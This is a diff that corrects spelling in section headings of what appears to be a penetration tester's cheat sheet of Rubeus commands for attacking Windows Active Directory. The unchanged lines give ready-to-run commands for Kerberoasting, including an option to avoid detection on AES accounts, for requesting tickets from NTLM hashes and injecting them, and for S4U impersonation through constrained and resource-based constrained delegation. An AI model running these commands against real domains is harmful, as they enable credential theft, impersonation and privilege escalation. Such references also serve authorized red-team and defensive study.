@@ -32,13 +32,13 @@
 .\Rubeus.exe kerberoast /outfile:<output_TGSs_file>
 ```
 
-## Kerberoasting and outputing on a file with a spesific format
+## Kerberoasting and outputting on a file with a spesific format
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
 ```cmd
 .\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name>
 ```
 
-## Kerberoasting whle being "OPSEC" safe, essentially while not try to roast AES enabled accounts
+## Kerberoasting while being "OPSEC" safe, essentially while not try to roast AES enabled accounts
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
 ```cmd
 .\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /rc4opsec
@@ -74,7 +74,7 @@
 .\Rubeus.exe asktgt /user:<user> /domain:<domain_name> /rc4:<ntlm_hash> /ptt
 ```
 
-## S4U - with ticket - Contrained delegation
+## S4U - with ticket - Constrained delegation
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
 ```
 .\Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<user> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /ptt
@@ -92,7 +92,7 @@
 .\Rubeus.exe hash /password:<machine_password>
 ```
 
-## S4U - Resource based contrained delegation
+## S4U - Resource based constrained delegation
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
 ```
 .\Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:<user_to_impersonate> /msdsspn:cifs/<domain_fqdn> /domain:<domain_name> /ptt
